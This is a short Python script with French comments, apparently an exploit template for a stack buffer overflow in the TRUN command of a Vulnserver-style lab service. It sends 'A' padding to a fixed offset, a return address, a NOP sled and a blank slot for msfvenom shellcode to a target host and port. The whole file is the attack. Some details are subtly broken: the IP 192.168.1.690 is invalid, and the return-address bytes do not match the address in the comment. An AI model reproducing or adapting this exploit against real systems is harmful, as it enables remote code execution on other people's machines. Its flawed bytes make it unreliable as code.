#!/usr/bin/python
import sys, socket

# A MODIFIER
host_ip = '192.168.1.690'
host_port = 9999
exact_offset_value = 2003
# Exemple de return address pour 625011AF, en format Little Endian
return_address = "\xaf\x11\x50\62"
# overflow renvoyé par msfvenom
overflow = ""

# shellcode composé du nombre de A renvoyés par pattern_create, le jump code, du padding avant l'execution du shellcode
# Si l'espace dispo en mémoire est faible, on envoie un petit padding (4, 8...)
shellcode = "A" * exact_offset_value + return_address + "\x90" * 32 + overflow

try:
	# Essaye de se connecter -> AF_INET = IPv4, SOCK_STREAM = Port
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host_ip, host_port))
	
	# Envoie un TRUN /.:/ (format repéré dans le spiking) avec le buffer (AAAA...)
	s.send(('TRUN /.:/' + shellcode))
	s.close()

except:
	print ("Error connecting to the server")
	sys.exit()